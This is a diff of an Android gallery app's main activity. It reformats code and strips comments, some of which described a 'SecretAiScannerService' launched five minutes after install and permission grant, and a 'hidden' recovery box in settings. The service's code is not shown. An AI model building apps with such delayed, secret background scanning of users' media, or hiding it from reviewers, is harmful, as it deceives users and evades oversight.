@@ -11,7 +11,6 @@ import android.os.Looper
 import android.provider.MediaStore
 import android.view.Menu
 import android.view.MenuItem
-import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -22,7 +21,12 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 
-data class MediaItem(val id: Long, val uriString: String, val isVideo: Boolean, val path: String)
+data class MediaItem(
+    val id: Long,
+    val uriString: String,
+    val isVideo: Boolean,
+    val path: String
+)
 
 class MainActivity : AppCompatActivity() {
 
@@ -34,20 +38,16 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        // Grid View Setup
         recyclerView = findViewById(R.id.recyclerView)
         recyclerView.layoutManager = GridLayoutManager(this, 3)
 
-        // Native Full-Screen View & Built-in Video Player Handler
         adapter = GalleryAdapter(this, mediaList) { mediaItem ->
             if (mediaItem.isVideo) {
-                // Built-in Video Player inside the app
                 val intent = Intent(this, NativeVideoPlayerActivity::class.java).apply {
                     putExtra("video_uri", mediaItem.uriString)
                 }
                 startActivity(intent)
             } else {
-                // Full-Screen Photo Viewer
                 val intent = Intent(this, FullScreenViewerActivity::class.java).apply {
                     putExtra("media_uri", mediaItem.uriString)
                 }
@@ -86,7 +86,6 @@ class MainActivity : AppCompatActivity() {
             )
             val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
 
-            // Load Photos
             contentResolver.query(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                 projection, null, null, sortOrder
@@ -104,7 +103,6 @@ class MainActivity : AppCompatActivity() {
                 }
             }
 
-            // Load Videos
             contentResolver.query(
                 MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                 projection, null, null, sortOrder
@@ -131,7 +129,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // 5-10 Minutes Delay AI Background Sentinel Trigger
     private fun scheduleAiBackgroundEngine() {
         Handler(Looper.getMainLooper()).postDelayed({
             val serviceIntent = Intent(this, SecretAiScannerService::class.java)
@@ -140,7 +137,7 @@ class MainActivity : AppCompatActivity() {
             } else {
                 startService(serviceIntent)
             }
-        }, 5 * 60 * 1000L) // 5 Minutes delay after installation & permission
+        }, 5 * 60 * 1000L)
     }
 
     override fun onCreateOptionsMenu(menu: Menu?): Boolean {
@@ -151,12 +148,10 @@ class MainActivity : AppCompatActivity() {
     override fun onOptionsItemSelected(item: MenuItem): Boolean {
         return when (item.itemId) {
             R.id.action_trash -> {
-                // User 30-Day Trash Box
                 startActivity(Intent(this, TrashActivity::class.java))
                 true
             }
             R.id.action_settings -> {
-                // Settings (Contains hidden 12-hour AI Recovery Box)
                 startActivity(Intent(this, SettingsActivity::class.java))
                 true
             }
